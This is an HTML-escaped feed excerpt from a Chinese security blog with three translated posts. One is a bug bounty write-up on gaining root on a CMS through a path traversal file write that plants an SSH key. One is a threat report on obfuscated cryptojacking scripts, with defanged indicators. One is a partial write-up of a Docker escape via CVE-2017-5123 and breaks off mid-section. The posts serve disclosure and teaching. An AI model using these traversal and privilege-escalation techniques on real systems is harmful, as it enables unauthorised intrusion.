&lt;p&gt;&lt;a href=&quot;http://blog.jr0ch17.com/&quot; title=&quot;link to home of Jasmin Landry, a.k.a JR0ch17&quot;&gt;&lt;strong&gt;Jasmin Landry, a.k.a JR0ch17&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2018年1月25日 • 在&lt;a href=&quot;http://blog.jr0ch17.com/tags/#bugbounty&quot;&gt;bugbounty &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#rce&quot;&gt;RCE &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#shell&quot;&gt;Shell&lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#lfd&quot;&gt;LFD &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#xss&quot;&gt;XSS &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#xxe&quot;&gt;XXE &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#ssh&quot;&gt;SSH &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;這篇博文是關於我的第一篇 &lt;del&gt;RCE&lt;/del&gt; shell（或者隨便你想怎麼叫它），是篇我在2017年夏季獲得了一個Bug Bounty(錯誤賞金)計劃。這絕對沒有什麼特別之處，你甚至可能不會學到任何新東西，但如果你這樣做，我很高興我能幫你！我只是覺得這是一種獲得一個盒子的不同方式，特別是在Bug Bounty方面。&lt;/p&gt;

&lt;h3 id=&quot;偵察總是挺有趣的&quot;&gt;偵察總是挺有趣的&lt;/h3&gt;

&lt;p&gt;使用&lt;a href=&quot;https://github.com/aboul3la/Sublist3r&quot;&gt;Sublist3r&lt;/a&gt;，&lt;a href=&quot;https://github.com/michenriksen/aquatone&quot;&gt;Aquatone&lt;/a&gt;，&lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt;等工具對*.domain.com 範圍內的網域進行定期偵察後，我最終列出了數百個子域。我不知道從哪裡開始，因此我決定使用&lt;a href=&quot;https://github.com/ChrisTruncer/EyeWitness&quot;&gt;EyeWitness&lt;/a&gt;截取網頁截圖，以便了解哪些目標看起來很脆弱，以便我可以從這些截圖開始破冰。在EyeWitness報告中，有一個應用程序在8080埠上運行，它有一個我從未聽說過的CMS的默認主頁，因此我決定首先查看是那個CMS。通過瀏覽目標，我很快找到了一個登錄頁面，幸運的是，我的默認憑據是 &lt;strong&gt;admin：admin&lt;/strong&gt;。然而，它的管理面板中完全沒有任何東西，沒甚麼有料的訊息，完全沒有，它根本是空的。但我仍然決定將它以&lt;strong&gt;“管理面板中的默認憑據”&lt;/strong&gt;為標題的問題報告給Bug Bounty計劃，幸運的是即使我沒有獲得任何敏感訊息，他們也願意將其作為一個重要的bug進行獎勵。&lt;/p&gt;

&lt;h3 id=&quot;jobert的名言&quot;&gt;Jobert的名言&lt;/h3&gt;

&lt;p&gt;僅僅通過默認主頁的外觀以及它在管理面板中的樣子，我覺得應該還有更多細節在裡面。正如&lt;a href=&quot;https://twitter.com/jobertabma&quot;&gt;Jobert&lt;/a&gt;曾經說過的那樣，&lt;em&gt;如果它看起來很老很脆弱，那很可能就是你想的那樣！&lt;/em&gt;我決定看看CMS的網站，看看我能否獲得更多的訊息。這是一個開源軟體，所以我想我會在AWS上啟動一個EC2實例並將它安裝在那裡，以便我可以自己玩。我注意到該服務必須以sudo權限運行，這顯然不是最佳實作方式（稍後請牢記這點）。完成設置後，我做了一個快速的Google搜索，看看能否找到該軟體的任何現有CVE，有趣的是，再也找不到任何東西。所以這意味著很有可能沒有人對此軟體進行安全審查或滲透測試。我知道事實後該秀一波了!
&lt;a href=&quot;https://memecreator.org/static/images/memes/3013268.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;簡潔快速的去發現些甚麼吧&quot;&gt;簡潔快速的去發現些甚麼吧&lt;/h3&gt;

&lt;p&gt;我瀏覽了大約30分鐘到一個小時，以便很好地了解它是如何運作的。在我這樣做的時候，我很快找到了2個XSS; 一個存儲型，一個及時反應型。然後在檢查Burp Suite中的所有請求後，我最終找到了1個LFD和2個XXE。它有很多API終端，所以我查看了他們的API文檔，並很快意識到在該CMS上的每個可能的操作都有不正確的訪問控制。這意味著未經身份驗證的遠程攻擊者可以利用存儲的XSS，LFD和兩個XXE攻擊其自身，甚至無需登錄管理頁面。最重要的是，它也沒有CSRF保護，所以如果攻擊者不想利用這些漏洞，他們也可以很容易地創建一些CSRF攻擊並嘗試讓管理員為他們自動做這件事！&lt;/p&gt;

&lt;h3 id=&quot;directory-traversal救世界&quot;&gt;/directory traversal救世界！&lt;/h3&gt;

&lt;p&gt;此時此刻我已經預見，在這個CMS上成功製造RCE只是一個時間的問題。我只是需要繼續探索，然後我最終絕對會找到一個。我之前發現的一個有趣的終端是我可以更新模板文件。它有趣的點是它用於更新模板的參數。下面這就是它的樣子。 &lt;strong&gt;&lt;em&gt;(所有敏感信息已處理)&lt;/em&gt;&lt;/strong&gt;
&lt;img src=&quot;http://blog.jr0ch17.com/images/POST_request.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在成功更新後，回覆將如下所示。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.jr0ch17.com/images/POST_Response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我必須嘗試的下一個邏輯是將路徑更改為其他內容，用以查看是否可以將文件上傳到&lt;code class=&quot;highlighter-rouge&quot;&gt;/config&lt;/code&gt;文件夾中。所以我給了它如下路徑:&lt;code class=&quot;highlighter-rouge&quot;&gt;/../../../../../../../../../../../../tmp/test.txt&lt;/code&gt;並用&lt;code class=&quot;highlighter-rouge&quot;&gt;This is a test.&lt;/code&gt;替換了POST的主體。我得到了與以前的請求相同的Response…太神啦！但是，我接下來該如何確認該文件是否已真正上傳完成了？不要忘記，這個測試是在我自己的伺服器上完成的，所以我可以自己檢查文件是否在那裡，但這太白箱了。我想走黑箱路線並找到另一種方法來確認這件事。於是就請到LFD來拯救世界啦！使用我已經發現的LFD/directory traversal來幫助我檢查確認文件是否完成上傳。而它真的上去了！ 
&lt;img src=&quot;http://blog.jr0ch17.com/images/LFI.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;沒有rce現在該怎麼辦&quot;&gt;沒有RCE，現在該怎麼辦？&lt;/h3&gt;

&lt;p&gt;好了！現在我知道我們可以上傳文件，而且不僅僅是傳到伺服器上的某些固定位置，我可以將它們上傳到任何我想要的地方，因為服務是以root權限運行。&lt;/p&gt;

&lt;p&gt;當然，下一步是嘗試執行我上傳的文件嗎？那麼，事實證明，對我來說實際上是一個問題。該服務在Tomcat中是作為一個&lt;code class=&quot;highlighter-rouge&quot;&gt;war&lt;/code&gt;文件進行部署，所以沒有一個真正可以上傳和執行文件的特定路徑。也許如果有別人幫助的話，我可能已經想出如何解決這一點的方法，但由於我不太熟悉又沒人幫助，所以我很不幸的在那個時候無法做任何事情往下深入。這讓我回想起我在OSCP工作的日子。我手邊仍然有我的筆記，所以我翻了翻他們，並藉此獲得了一些想法。我首先上傳了一個bash腳本到&lt;code class=&quot;highlighter-rouge&quot;&gt;cron.hourly&lt;/code&gt;資料夾，但使用默認的操作系統配置，但這步棋並沒有成功。假設Bug Bounty計劃具有相同的默認設置，那麼這招很可能也無法成功運作。然後我告訴自己:好吧，我手上有root權限了，為什麼不直接SSH連到盒子裡？&lt;/p&gt;

&lt;p&gt;為此，我必須將我的SSH密鑰上傳到伺服器。這很簡單，我只需要相應地配置路徑參數，並將我的SSH密鑰放在POST請求的主體中。 
&lt;img src=&quot;http://blog.jr0ch17.com/images/SSH.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;剩下的最後一件事就是嘗試用我新上傳的SSH密鑰登錄。你看看，這不就成功了？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.jr0ch17.com/images/ID.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在我已經完成了我的目標，我決定是時候報告這些錯誤了。我聯繫了CMS的開發團隊，讓他們知道這些漏洞，他們立即回答我是否想加入他們的Slack團隊，以便我們可以更多地討論我的報告。我們通過幾次電話聯繫來澄清幾點，他們讓我在更新發布之前先測試看看他們的新版本。&lt;/p&gt;

&lt;p&gt;我還將這些錯誤報告給使用該CMS的Bug Bounty計劃。我顯然沒有在他們的網站上測試任何東西，因為它不符合道德規範，但我確實為我的所有發現提供了一個清晰的PoC，要求他們測試他們的結果。我的所有報告都經過了驗證並被接受，其中也一併包括SSH密鑰的文件上傳的部分。這是我被認可的第一個“RCE”的Bug Bounty計劃！&lt;/p&gt;

&lt;p&gt;如有任何問題或意見，請不要猶豫，直接在Twitter上DM我吧~ :)&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Bug Bounty" /><category term="Penetration Test" /><summary type="html">何不食肉糜?</summary></entry><entry><title type="html">挖礦JavaScript代碼的感染趨勢</title><link href="https://security-onigiri.github.io//2018/04/18/javascript.html" rel="alternate" type="text/html" title="挖礦JavaScript代碼的感染趨勢" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/javascript</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/javascript.html">&lt;p&gt;威脅研究&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;作者 &lt;a href=&quot;https://www.fortinet.com/blog/search.html?author=Eric+Chong&quot;&gt;Eric Chong&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;2018年2月8日&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;1-charcode-javascript&quot;&gt;1. CharCode JavaScript&lt;/h2&gt;
&lt;p&gt;2017年12月6日，FortiGuard實驗室發現了一個被入侵的網站 - acenespargc.com。查看源碼，我們注意到一個可疑的加密腳本，它使用eval（）函數將所有字符轉換為數字。我們使用了一個名為&lt;a href=&quot;http://jdstiles.com/java/cct.html&quot;&gt;CharCode Translator&lt;/a&gt;的工具將這些數字轉換  回程式碼。然後我們就可以反查到將使用者轉址到詐騙網頁或釣魚網站的鏈接。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/p2wS40L.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;第1部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/emTmBaL.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;第2部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;以上只是一個簡單的例子。犯罪者實際上可以根據地理位置自定義釣魚的內容，為了更好地避開檢測機制，它會在檢測到您之前曾訪問過釣魚頁面時消失。&lt;/p&gt;

&lt;p&gt;使用這種技術，犯罪者可以隱藏惡意/網路釣魚/廣告URL，以免被肉眼看到。&lt;/p&gt;

&lt;p&gt;正如你將在下面看到的，犯罪者現在已經採用這種技術來隱藏在受感染的網站中挖掘加密貨幣的JavaScript，這樣任何訪問該網站的人都將“受到感染”，並且他們的電腦將持續為犯罪者提供加密演算資源。我們將此類活動歸類為惡意行為，因為它未經其許可使用其他人的資源。&lt;/p&gt;

&lt;h2 id=&quot;2使用打包工具隱藏coinhive腳本&quot;&gt;2.使用打包工具隱藏CoinHive腳本&lt;/h2&gt;

&lt;p&gt;在12月28日，FortiGuard實驗室通過一位客戶的關係發現了另一個惡意網站正使用我們上面介紹的混淆技巧 - romance-fire[.]com。該網站包含用於加密貨幣挖掘的混淆惡意代碼。&lt;/p&gt;

&lt;p&gt;我們發現了編碼腳本，並使用&lt;a href=&quot;http://matthewfl.com/unPacker.html&quot;&gt; packer tool &lt;/a&gt;來解壓縮腳本，發現該腳本與CoinHive有連接。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jyV0AJw.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;來自源代碼的JavaScript&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/IjGjCUr.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第1部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我們注意到URL（hxxp：//3117488091/lib/jquery-3.2.1.min.js？v=3.2.11）似乎不是有效的IP或網域。於是我們做了一些研究，我們在&lt;a href=&quot;http://www.kloth.net/services/iplocate.php&quot;&gt;KLOTH.NET&lt;/a&gt;上轉換它後，發現’3117488091’是185.209.23.219的十進制IP。以下是結果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jO6HlvS.png&quot; alt=&quot;&quot; /&gt;
該網站將URL轉換為&lt;code class=&quot;highlighter-rouge&quot;&gt;hxxp：//185.209.23.219/lib/jquery-3.2.1.min.js？v=3.2.11)&lt;/code&gt;。我們從該URL中查到相同的JavaScript模式，因此我們再次解壓縮腳本。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Z32sbbB.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第2部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在最後一輪解包之後，我們終於能夠查看包含CoinHive URL的完整程式碼：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TU9SUa0.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第3部分&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;3來自github的coin礦工&quot;&gt;3.來自GitHub的Coin礦工&lt;/h2&gt;

&lt;p&gt;2018年1月26日，我們發現了另一個網站 - sorteosrd[。]com，它也通過劫持訪問者的CPU來挖掘加密貨幣。這種加密惡意軟體再次允許劫持者在未經該電腦用戶許可的情況下藉由挖掘數位貨幣受益。我們相信這個網站可能已被挾持或網站管理員自己本身如此使用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QNmQTW1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hxxp：//sorteosrd.com網站的源代碼：&lt;/code&gt;
&lt;img src=&quot;https://i.imgur.com/RSEb8qr.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;暗中加密對用戶設備的影響&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;正如我們從上面的截圖中可以看到的那樣，加密貨幣挖礦機在訪問該網站後充分利用其CPU時會大大降低PC的速度。&lt;/p&gt;

&lt;h2 id=&quot;4被挾持的網站---感染cryptocoin挖礦的黑莓&quot;&gt;4.被挾持的網站 - 感染CryptoCoin挖礦的黑莓&lt;/h2&gt;
&lt;p&gt;CoinHive腳本的另一個被挾持的例子是一個絕對會令人驚訝的網站 - blackberrymobile[.]com上發現的。
&lt;img src=&quot;https://i.imgur.com/wjclu4E.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;即使是黑莓網站也在短時間內被盜用在挖掘Monero加密貨幣。&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;5被挾持的網站---milk-new-zealand-感染-deepminer-工具&quot;&gt;5.被挾持的網站 - Milk New Zealand 感染 deepMiner 工具&lt;/h2&gt;
&lt;p&gt;此外，我們還發現New Zealand最大的日記農場集團之一──Milk New Zealand也遭到了破壞。我們的AntiVirus實驗室檢測到來自該網站的惡意活動，所以我們查看他的源碼，發現其有使用github上的deepMiner工具，其中發現了一個用於挖掘Monero、Electroneum、Sumokoin等的腳本。請參見下面的截圖：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QXgfpMu.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;使用deepMiner的JavaScript&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;根據上面屏幕截圖中的數據，我們了解到，這種腳本在其網域中使用DDNS，並且只會將CPU使用率增加50％，以使終端用戶受害者的負面使用者體驗不太明顯。&lt;/p&gt;

&lt;h2 id=&quot;6甚至youtube也會通過投放挖礦廣告&quot;&gt;6.甚至YouTube也會通過投放挖礦廣告&lt;/h2&gt;

&lt;p&gt;加密貨幣挖掘惡意軟體的問題越來越嚴重。隨著希望通過劫持CPU以從加密貨幣獲得收益的犯罪者數量不斷增加，加密技術越來越多地出現在惡意軟體中。一周前，一位犯罪者設法將挖礦腳本注入到線上廣告中後，幾個惡意廣告隨即在YouTube上彈出。幸運的是，YouTube迅速發現了該問題，並在兩小時內刪除了受影響的廣告。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/CO4RnSz.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;惡意加密YouTube廣告&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;你能做些什麼來防止或避免coin-miner劫持&quot;&gt;你能做些什麼來防止或避免Coin Miner劫持？&lt;/h2&gt;

&lt;p&gt;清除瀏覽器緩存，或安裝ccleaner軟體，從電腦中查找並刪除不需要的文件和無效的Windows註冊表項。
在瀏覽器中禁用JavaScript或運行腳本攔截工具或附加元件。
安裝防病毒軟體，如FortiClient。
安裝並運行AdBlocker或類似的工具，例如Ghostery。
FortiGuard已將此Blog中列出的所有URL列進黑名單。&lt;/p&gt;

&lt;h2 id=&quot;iocs&quot;&gt;IOCs:&lt;/h2&gt;

&lt;p&gt;被挾持的網站：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;acenespargc[.]com&lt;/li&gt;
  &lt;li&gt;www[.]romance-fire[.]com&lt;/li&gt;
  &lt;li&gt;milknewzealand[.]com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;已觀察到的虛擬貨幣挖掘網址：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;hxxp://coinhive[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://minerhills[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://crypto-webminer[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://sorteosrd[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://greenindex[.]dynamic-dns[.]net&lt;/li&gt;
  &lt;li&gt;hxxps://github[.]com/deepwn/deepMiner&lt;/li&gt;
&lt;/ul&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Coin Miner" /><category term="Obfuscation Technique" /><summary type="html">威脅研究</summary></entry><entry><title type="html">使用 CVE-2017-5123 逃離 Docker 容器</title><link href="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html" rel="alternate" type="text/html" title="使用 CVE-2017-5123 逃離 Docker 容器" /><published>2018-03-31T00:00:00+08:00</published><updated>2018-03-31T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html">&lt;p&gt;The post describes how I exploited the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; vulnerability in order to modify the &lt;a href=&quot;https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt&quot;&gt;Linux capabilities&lt;/a&gt; of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這篇文章描述我如何利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 修改 Docker 容器的 Linux capabilities 從而取得更高的權限，最後逃離了容器監獄。如果你想要看看 Twistlock 如何在他的軌跡中阻止這個弱點，在這篇&lt;a href=&quot;https://www.twistlock.com/2018/01/16/blocking-malicious-behavior-exploits-containers-twistlock/&quot;&gt;文章&lt;/a&gt;有。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities. This results in the ability to enable promiscuous mode on &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(docker bridge for the container):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;但在我們深入之前，一張圖勝過千言萬語，這是我的利用過程。它修改容器化行程在記憶體中的 capabilities 結構，導致取得 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities。這意味著有能力開啟 &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(容器的 docker bridge) 的混沌模式&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=IdRDFS4u2rQ&quot;&gt;Youtube 影片&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Note that I have turn off &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt; for the recording, but it also works with &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; as we can find the kernel base and the heap base by using the same vulnerability.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;請留意我在影片中已經關掉 &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt;，但在 &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; 的狀態下依然可以藉由同一個弱點成功找到核心基址與堆積基址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;CVE-2017-5123 was published earlier this year on Oct 12 - it was a Linux kernel vulnerability in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall for 4.12-4.13 kernel versions. The &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall defined as:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-5123&quot;&gt;CVE-2017-5123&lt;/a&gt; 是今年 8 月 12 日發布 - 它是一個在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫的 Linux 核心 4.12-4.13 版本弱點。&lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫定義為：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;int waitid(idtype_t idtype, it_t id, siginfo_t *infop, int options);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;pointer above. The pointer points to a struct siginfo described below. In this struct we can control sveral variables, specifically pid and status.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;該弱點允許一個攻擊者寫入部份可控資料到攻擊者選擇的核心記憶體位址中。核心記憶體位址可以由&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;指標提供。這個指標指向一個結構&lt;code class=&quot;highlighter-rouge&quot;&gt;siginfo&lt;/code&gt;如下所述。在這個結構我們可以控制數個變數，特別是&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;與&lt;code class=&quot;highlighter-rouge&quot;&gt;status&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As you can see below, the control is rather indirect.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下面如你所見，這個控制相當不直接。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int padding; // this remains unchaged by waitid
    int pid;     // process id
    int uid;     // user id
    int status;  // return code
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value by creating a lot of processes with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt; until we hit the desired &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value. Still, we are limited by the &lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt; value of the system, which is by default configured to be 32768 which equals to 0x8000 in hex.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;多數的數值無法被我們控制，或是對我們來說在大小方面有所限制，然而我們可以藉由&lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt;的幫助創造很多行程，來控制 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;的值，直到我們觸碰到想要的&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;為止。但我們仍受限於系統中&lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt;的值，預設為 &lt;em&gt;32768&lt;/em&gt; 等於 十六進位 &lt;em&gt;0x8000&lt;/em&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Note: In a non-containerized environment we could elevate this number after changing our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; to 0 and gain root privileges, as we could modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_mx&lt;/code&gt; to any number.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：在一個非容器的環境，我們可以在將 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 設為0後提高這個數字，並取得 root 權限，如同我們可以修改 &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_max&lt;/code&gt; 為任何數字。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;linux-capabilities&quot;&gt;Linux Capabilities&lt;/h2&gt;

&lt;p&gt;In this section I’ll focus on a short overview of Linux capabilities - what they are, how Docker uses them, and how they are represented in the memory.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在這個章節我將專注在簡短概觀的 Linux capabilities - 它們是什麼，與Docker 如何使用它們，與它們在記憶體中如何被表示。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The code snippet below is taken from &lt;em&gt;linux/cred.h&lt;/em&gt; and is the definition of the credentails struct that each process has:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下方是從 &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/include/linux/cred.h&quot;&gt;linux/cred.h&lt;/a&gt; 擷取的程式碼片段 ，為每個行程的認證資訊結構：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct cred {
    atomic_t usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t subscribers; /* number of processes subscribed */
    void *put_addr;
    unsigned magic;
#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t uid; /* real UID of the task */
    kgid_t gid; /* real GID of the task */
    kuid_t suid; /* saved UID of the task */
    kgid_t sgid; /* saved GID of the task */
    kgid_t euid; /* effective UID of the task */
    kuid_t egid; /* effective GID of the task */
    kuid_t fsuid; /* UID for VFS ops */
    kgid_t fsgid /* GID for VFS ops */
    Unsigned securebits; /* SUID-less security management */
    Kernel_cap_t cap_inheritable; /* caps our children can inherit */
    Kernel_cap_t cap_permitted; /* caps we're permitted */
    Kernel_cap_t cap_effective; /* caps we can actually use */
    Kernel_cap_t cap_ambient; /* Ambient capability set */
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;man capabilities:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuse into distinc units, known as &lt;em&gt;capabilities&lt;/em&gt;, which can be independently enabled and disabled. Capabilities are a per-thread attribute.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;從核心 2.2開始，Linux 將傳統與超級使用者相關聯的權限分成不同的單元，可被個別啟用及停用，並稱之為 &lt;em&gt;capabilities&lt;/em&gt;。每個執行緒都會有各自的 Capabilities 屬性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Linux capabilities are stored inside each process’s own &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and represented by a bitmask. For example all caps enabled would be represented by a bitmask of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
